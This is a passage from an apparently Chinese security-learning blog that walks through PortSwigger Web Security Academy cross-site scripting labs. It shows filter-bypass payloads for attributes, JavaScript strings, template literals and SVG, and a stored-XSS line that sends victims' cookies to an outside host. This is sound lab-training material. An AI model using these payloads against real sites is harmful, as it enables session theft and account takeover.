class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserCard</span> <span class="keyword">extends</span> <span class="title class_ inherited__">HTMLElement</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="keyword">var</span> shadow = <span class="variable language_">this</span>.<span class="title function_">attachShadow</span>(&#123;<span class="attr">mode</span>: <span class="string">&#x27;open&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> wrapper = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> username = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> email = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        username.<span class="property">textContent</span> = <span class="string">&#x27;用户名：&#x27;</span> + <span class="variable language_">this</span>.<span class="title function_">getAttribute</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">        email.<span class="property">textContent</span> = <span class="string">&#x27;电子邮件：&#x27;</span> + <span class="variable language_">this</span>.<span class="title function_">getAttribute</span>(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        shadow.<span class="title function_">appendChild</span>(wrapper);</span><br><span class="line">        wrapper.<span class="title function_">appendChild</span>(username);</span><br><span class="line">        wrapper.<span class="title function_">appendChild</span>(email);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册新元素：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">customElements.<span class="title function_">define</span>(<span class="string">&#x27;user-card&#x27;</span>, <span class="title class_">UserCard</span>);</span><br></pre></td></tr></table></figure><p>使用自定义标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user-card</span> <span class="attr">name</span>=<span class="string">&quot;张三&quot;</span> <span class="attr">email</span>=<span class="string">&quot;zhangsan@example.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">user-card</span>&gt;</span></span><br></pre></td></tr></table></figure><p>试了刚爆破得到的自定义标签都不行。直接在 xss cheat-sheet 上搜索 <strong>custom-tags</strong>，选一个 payload <code>&lt;xss tabindex=1 onfocus=alert(1)&gt;&lt;/xss&gt;</code>。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125131130.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125131130.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125132414.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125132414.png"></a></p><p>按下 tab 键聚焦到 <code>&lt;xss&gt;</code> 标签上，触发 <code>alert()</code>。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125132432.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125132432.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125133248.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125133248.png"></a></p><p><strong>Body</strong> 部分的代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">location = <span class="string">&quot;https://0a7e00c3036288a98023f9df00c2007b.web-security-academy.net/?search=%20%3c%78%73%73%20%61%75%74%6f%66%6f%63%75%73%20%74%61%62%69%6e%64%65%78%3d%31%20%6f%6e%66%6f%63%75%73%3d%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3e%3c%2f%78%73%73%3e&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">解码后：</span><br><span class="line">search=<span class="tag">&lt;<span class="name">xss</span> <span class="attr">autofocus</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onfocus</span>=<span class="string">alert(document.cookie)</span>&gt;</span><span class="tag">&lt;/<span class="name">xss</span>&gt;</span></span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">location = <span class="string">&#x27;https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x&#x27;</span>; </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">解码后：<span class="tag">&lt;<span class="name">xss</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">onfocus</span>=<span class="string">alert(document.cookie)</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span>#x</span><br></pre></td></tr></table></figure><blockquote><p>[!note] location 对象<br><code>location</code> 对象在 JavaScript 中用于获取或设置当前文档的 URL</p></blockquote><p>‘#x’ 是锚点，能聚焦到 ‘id&#x3D;x’ 的元素，从而触发 <code>onfocus</code> 事件，两者组合，达到 <code>autofocus</code> 的效果。</p><blockquote><p>[!question] 问题<br>exploit server 里面的 body 部分如何编写？每次都是本地手动测试通过但是不会编写 exploit server。</p><p>不管是使用 <code>&lt;iframe&gt;</code> 标签还是 <code>&lt;script&gt;</code> 目的都是为了模拟受害人操作，<strong>触发所构造的 url</strong>，达到 ‘Your solution must <strong>not require any user interaction</strong>‘ 的要求。</p></blockquote><p><code>&lt;firame&gt;</code> 与 <code>&lt;sctipt&gt;</code> 的不同：</p><ul><li><strong><code>&lt;iframe&gt;</code> 标签</strong>：<code>&lt;iframe&gt;</code> 中的内容通常受到<strong>同源策略</strong>的限制(<code>X-Frame-Options</code>)，尤其是当它尝试访问或修改父页面内容时，如 Lab-10 使用 <code>&lt;iframe&gt;</code> 就没问题。</li><li><strong><code>&lt;script&gt;</code> 标签</strong>：通过 <code>&lt;script&gt;</code> 标签注入的代码不受<strong>同源策略</strong>的限制，因为它直接成为了加载它的页面的一部分，location 就相当于是<strong>重定向</strong>。</li></ul><hr><p>在 Body 中使用 <code>&lt;iframe&gt;</code> 报错。payload：<code>&lt;iframe src=&quot;https://0a5500d0036f773980c1e47d00b00003.web-security-academy.net/?search=&lt;xss%20autofocus%20onfocus=&#39;alert(1)&#39;&gt;&lt;/xss&gt;&quot;&gt;&lt;/iframe&gt;</code></p><hr><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125140427.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125140427.png"></a></p><p>报错信息如下，受到 [[浏览器的同源策略]] 影响，<code>X-Frame-Options</code> 头部。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125140628.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125140628.png"></a></p><h1 id="12-Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><a href="#12-Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded" class="headerlink" title="12 Lab: Reflected XSS into attribute with angle brackets HTML-encoded"></a>12 Lab: Reflected XSS into attribute with angle brackets HTML-encoded</h1><p>任务描述：<code>search</code> 功能存在 xss 漏洞，利用该漏洞，调用 <code>alert()</code></p><p>搜索的内容会现在了页面上，且回显了两处，一处是 <code>&lt;h1&gt;</code> 标签，一处是 <code>&lt;input&gt;</code> 中的 <code>value</code> 属性。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128142419.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128142419.png"></a></p><p>构造 payload 1: <code>&#39;&lt;xss autofocus tabindex=1 onfocus=alert(1)&gt;&lt;/xss&gt;</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128142949.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128142949.png"></a></p><p>使用 HTML 编码。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128142914.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128142914.png"></a></p><p><code>&lt;h1&gt;</code> 中的回显仍然是字符串，但 <code>&lt;input&gt;</code> 的 <code>value</code> 属性对输入的 payload 进行了解析。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128142933.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128142933.png"></a></p><p>构造 payload 2: <code>&quot;&gt;&lt;xss autofocus tabindex=1 onfocus=alert(1)&gt;&lt;/xss&gt;</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128143455.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128143455.png"></a></p><p>编码绕过，payload 3: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x22;&amp;#x3e;&amp;#x3c;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x20;&amp;#x61;&amp;#x75;&amp;#x74;&amp;#x6f;&amp;#x66;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x73;&amp;#x20;&amp;#x74;&amp;#x61;&amp;#x62;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x65;&amp;#x78;&amp;#x3d;&amp;#x31;&amp;#x20;&amp;#x6f;&amp;#x6e;&amp;#x66;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x73;&amp;#x3d;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3e;&amp;#x3c;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x3e;</span><br></pre></td></tr></table></figure><p>但双引号没过去。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128143908.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128143908.png"></a></p><p>换一种思路，闭合属性，修改属性，paylaod 4: <code>&quot; autofocus tabindex=1 onfocus=alert(1) &quot;</code></p><p>成功。</p><p>回到上面的 payload 2 <code>&quot;&gt;&lt;xss autofocus tabindex=1 onfocus=alert(1)&gt;&lt;/xss&gt;</code> 在注入后发现，回显页面好像歪打正着，把一些关键属性 <code>autofocus</code>, <code>onfocus</code> 等都加进去了，由此想到：魔改一下这条 payload，没准就能执行了，后面 <code>&amp;quot</code> 可能是因为双引号没有闭合好。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128145344.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128145344.png"></a></p><p>修改后的 payload 5：<code>&quot;&gt;&lt;xss autofocus tabindex=1 onfocus=alert(1) &quot;</code></p><p>也成功注入，弹窗以后就不截了，没意思 ( ͠°◞  °)</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128145812.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128145812.png"></a></p><h1 id="13-Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><a href="#13-Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded" class="headerlink" title="13 Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded"></a>13 Lab: Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded</h1><p>题目中说这是一个存储型 XSS，我们直接看评论部分。</p><p>发布一条评论，之后看源码，有回显的位置就可能有 XSS，一共有三个，我在图中标记出来了，题目提示是 <code>href</code>，我们就先测这个。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128165506.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128165506.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128170104.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128170104.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128170754.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128170754.png"></a></p><p>payload <code>caishao.com&amp;#x22; onmouseover=alert(/xss/)</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128170719.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128170719.png"></a></p><p>因为过滤掉了双引号，需要闭合双引号的注入方式都不太行，这时可以考虑使用 javascript 伪协议，本质上也算是链接。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128171237.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128171237.png"></a></p><p>根据题目，使用 javascript 伪协议注入成功，Name 和 Comment 部分没成功。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128171333.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128171333.png"></a></p><blockquote><p>[!question] 问题<br>双引号还能使用哪些方式绕过？</p></blockquote><h1 id="14-Lab-Reflected-XSS-in-canonical-link-tag"><a href="#14-Lab-Reflected-XSS-in-canonical-link-tag" class="headerlink" title="14 Lab: Reflected XSS in canonical link tag"></a>14 Lab: Reflected XSS in canonical link tag</h1><p>原理：<a href="https://portswigger.net/research/xss-in-hidden-input-fields">XSS in hidden input fields</a></p><p>payload（文章里好像叫 vector:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;canonical&quot; accesskey=&quot;X&quot; onclick=&quot;alert(1)&quot; /&gt;</span><br></pre></td></tr></table></figure><p>直接修改 html 源码，按 “ALT+SHIFT+X” 能触发 <code>alert(1)</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128174205.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128174205.png"></a></p><p>现在问题就是如何修改 <code>&lt;link&gt;</code> 元素 –&gt; 在 url 上做文章？</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128175834.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128175834.png"></a></p><p>或者抓包，重放，在 burp 中修改。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128180142.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128180142.png"></a></p><p>之前我说过，挖洞就是寻找矛盾点或歧义，客户端和服务端对同一对象的不同解读方式，就可能产生漏洞。</p><p>如果要在 url 上做文章的话，例如 <code>/post?postId=4%22%20accesskey=%22X%22%20onclick=%22alert(1)</code>，本题的矛盾点就是服务端解读 <code>postId=4</code>，之后回显到客户端 <code>&lt;link&gt;</code> 标签的内容是 <code>[host]/post?postId=4%22%20accesskey=%22X%22%20onclick=%22alert(1)</code> 且<code>accesskey</code>, <code>onclick</code> 被解析为 html 属性。</p><p>&#x3D;&#x3D;&gt; sql 注入？</p><p>简单用 sqlmap 扫了一下，貌似并没有 sql 注入点。</p><p>我真是个大憨憨！为啥非得揪住一个需要传参数的页面呢，直接用主页不香嘛？ <code>web-security-academy.net/</code> 只要能把 url 回显到 <code>&lt;link&gt;</code> 标签就行。</p><p>payload: <code>web-security-academy.net/?%27accesskey=%27X%27onclick=%27alert(1)</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128235513.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128235513.png"></a></p><p>按下 “ALT+SHIFT+X” 能触发弹窗。</p><blockquote><p>[!question] 问题<br> 不过有一说一，为啥双引号不行？<code>web-security-academy.net/?%22%20accesskey=%22X%22onclick=%22alert(1)</code> </p></blockquote><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128235859.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128235859.png"></a></p><h1 id="15-Lab-Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped"><a href="#15-Lab-Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped" class="headerlink" title="15 Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped"></a>15 Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped</h1><p>在搜索框中搜索一串有辨识度的字符串 <code>CAISHAO</code>，使用 Ctrl+shift+f 搜索，观察其回显位置。一共有两处：一个是在 <code>&lt;h1&gt;</code> 标签中，一个是在 <code>script</code> 中，根据题目，我们直接测试 js 中的注入点。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240129210600.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240129210600.png"></a></p><p>用一个今天新看的 vector: <code>CAISHAO&#39;&lt;/script&gt;&lt;img src=javascript:alert(1) onerror=location=src&gt;</code>.</p><p>成功。</p><p>再来看这个 js 代码，输入中的 <code>&lt;/script&gt;</code> 成功截断了 js 代码块，且输入中的 <code>&lt;img&gt;</code> 标签被当成了 html 元素执行。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240129211318.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240129211318.png"></a></p><h1 id="16-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><a href="#16-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded" class="headerlink" title="16 Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded"></a>16 Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</h1><p>输入易辨识字符串，观察回显位置。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130155652.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130155652.png"></a></p><p>使用 Lab 15 的 vector，发现尖括号被过滤了。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130155911.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130155911.png"></a></p><p>换一种思路，没必要非得闭合 <code>&lt;script&gt;</code> 标签，只要我们的输入能被当作 js 代码执行就可以，为什么不直接拼接一个 <code>alert(/xss/)</code> 呢？（这里要注意注入后 js 语法的正确性。</p><p>构造 payload：<code>&#39;;alert(/xss/);&#39;</code>，成功。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130160303.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130160303.png"></a></p><p>solution 里面使用的 payload：<code>&#39;-alert(1)-&#39;</code></p><h1 id="17-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped"><a href="#17-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped" class="headerlink" title="17 Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped"></a>17 Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</h1><p>注入：<code>&#39;&lt;/script&gt;&lt;img src=javascript:alert(1) onerror=location=src&gt;&#39;</code>，发现双引号和尖括号被 HTML 编码，单引号被转义。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130162404.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130162404.png"></a></p><p>通过观察回显发现转义的方法存在缺陷，仅在单引号前加了个 <code>\</code>。</p><p>构造 payload  <code>\&#39;;alert(/xss/)//</code>，注入成功。</p><h1 id="18-Lab-Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped"><a href="#18-Lab-Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped" class="headerlink" title="18 Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped"></a>18 Lab: Stored XSS into <code>onclick</code> event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</h1><p>只有评论部分存在注入点，大概率就是存储型 xss（题干），随便发一条评论，观察回显位置。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130173442.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130173442.png"></a></p><p><code>&lt;a&gt;</code> 标签的 <code>onclick</code> 属性定义并调用一个空函数 <code>tracker()</code>，不管怎么传参都没法在 <code>tracker()</code> 上做文章。</p><p>利用 <code>href</code> 属性 payload: <code>http://caishao.com&quot; onmouseover=&#39;alert(/xss/)&#39;</code>，无效。根据题干也能看出来，双引号和尖括号被 HTML 编码，单引号和反斜杠被转义。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130211830.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130211830.png"></a></p><blockquote><p>[!question] 问题<br>双引号被 HTML 编码，还有能使用双引号的有效 payload 吗？感觉一旦使用 HTML 编码，绕过方式好像都在回避使用这个字符，如：伪协议绕过。</p></blockquote><p>单引号只是被转义，我们使用编码绕过。构造 payload <code>&#39;);alert(1);(&#39;</code>，将 <code>onclick</code> 属性中的 <code>tracker.track(&#39;</code> 闭合，再插入 <code>alert()</code> 函数。之后使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 编码，选择 “To HTML Entity”。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130213154.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130213154.png"></a></p><p>拼接完成的代码如下，点击链接，弹窗。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130213454.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130213454.png"></a></p><h1 id="19-Lab-Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked"><a href="#19-Lab-Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked" class="headerlink" title="19 Lab: Reflected XSS in a JavaScript URL with some characters blocked"></a>19 Lab: Reflected XSS in a JavaScript URL with some characters blocked</h1><p>题目上说是反射型 XSS，但我没找到注入点呀，只有评论区能输入，评论区的大概率是存储型的吧。 </p><p>迄今位置，遇到的反射型 XSS 注入点一般都在<strong>搜索框</strong>那块，能把输入回显在页面上（或 HTML 代码中），还遇到一个在有 <code>canonical</code> 属性的 <code>&lt;link&gt;</code> 标签里面。本题的注入点我还有点没找到emmm</p><p>简单阅读了一下源码，还真让我找到注入点了。点击 “Back to Blog” 后，跳转链接有一个 javascript 伪协议，其中会回显 url 的部分内容。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240130225536.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240130225536.png"></a></p><h1 id="20-Lab-Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped"><a href="#20-Lab-Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped" class="headerlink" title="20 Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped"></a>20 Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</h1><p>输入特殊字符串，观察其回显位置。发现在一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals">模板字面量</a>中，我们可以通过使用占位符 <code>$&#123;expression&#125;</code> 嵌入待替换的表达式，从而执行 js 代码。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131202249.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131202249.png"></a></p><p>构造 payload: <code>CAISHAO&#39; $&#123;alert(/xss/)&#125;</code>，虽然单引号使用了 unicode 编码，但嵌入表达式中的代码在创建字符串之前被成功执行。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131203125.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131203125.png"></a></p><h1 id="21-Lab-Reflected-XSS-with-some-SVG-markup-allowed"><a href="#21-Lab-Reflected-XSS-with-some-SVG-markup-allowed" class="headerlink" title="21 Lab: Reflected XSS with some SVG markup allowed"></a>21 Lab: Reflected XSS with some SVG markup allowed</h1><p>简单爆破一下，观察有哪些标签可以使用。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131204154.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131204154.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131205048.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131205048.png"></a></p><p>这里我用的是 PortSwigger XSS cheat sheet 里面的 tag 字典，可能不是太准确，在知道了 <code>&lt;svg&gt;</code> 可用之后，可以做一个字典爆破一下允许的 <code>&lt;svg&gt;</code> 标签，这里我直接选用 <code>&lt;image&gt;</code> 标签。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131205001.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131205001.png"></a></p><p>输入 <code>&lt;image&gt;</code> 虽然网页没有呈现什么，但其实已经回显在代码中了。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131205350.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131205350.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131205341.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131205341.png"></a></p><p>构造 payload <code>&lt;image src=javascript://alert(/xss/) onerror=location=src /&gt;</code> 却提示 “Event is not allowed”。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131205915.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131205915.png"></a></p><p>没必要搁那瞎猜了，已经知道是使用 svg 元素了，就直接拿 cheat-sheet 里面现有的 payload 试一试。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131210111.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131210111.png"></a></p><p>提示标签不对就换标签，提示事件不对就换事件。最后发现的有效的 payload：<code>&lt;svg&gt;&lt;animatetransform onbegin=alert(1) attributeName=transform&gt;</code>，主打一个随心所欲。</p><p>ps: 简单爆了一下允许的事件，发现就一个 <code>onbegin</code>，也就是说标签只能选 svg 的那几个动画元素了。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131211313.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131211313.png"></a></p><p>与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Element#svg_%E5%85%83%E7%B4%A0%EF%BC%88%E6%8C%89%E7%B1%BB%E5%88%AB%E5%88%86%E7%B1%BB%EF%BC%89">svg 的动画元素</a> 有关的 payload 的都能在 cheat-sheet 中找到，我的思路没毛病。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131211454.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131211454.png"></a></p><h1 id="22-Lab-Exploiting-cross-site-scripting-to-steal-cookies"><a href="#22-Lab-Exploiting-cross-site-scripting-to-steal-cookies" class="headerlink" title="22 Lab: Exploiting cross-site scripting to steal cookies"></a>22 Lab: Exploiting cross-site scripting to steal cookies</h1><p>目标：评论部分存在存储型 XSS，利用该漏洞拿到受害人的 cookie，然后利用该 cookie 模拟受害人登录。</p><p>注入了半天，发现直接在评论区内容部分写 js 就完事了，<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131232206.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131232206.png"></a></p><p>只要能把 <code>document.cookie</code> 传到服务器就行，这里的服务器我用的 Burp Collaborator 生成的。</p><p>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;https://example.com/?cookie=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 Collaborator 中可以查看获取到的 cookie。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240201102540.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240201102540.png"></a></p><blockquote><p>[!question] 问题<br>拿到 cookie 如何操作？</p><p><strong>答：</strong> 修改 cookie （Cookie-Editor or F12 Application），刷新页面即可。</p></blockquote><p>使用插件 Cookie-Editor，改不改没反应啊！</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240131232916.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240131232916.png"></a></p><p>F12 在 Application 里面改也没反应，这个 cookie 真的是受害人的嘛，按理说改一下 cookie 再刷新页面就进去了。</p><p><a 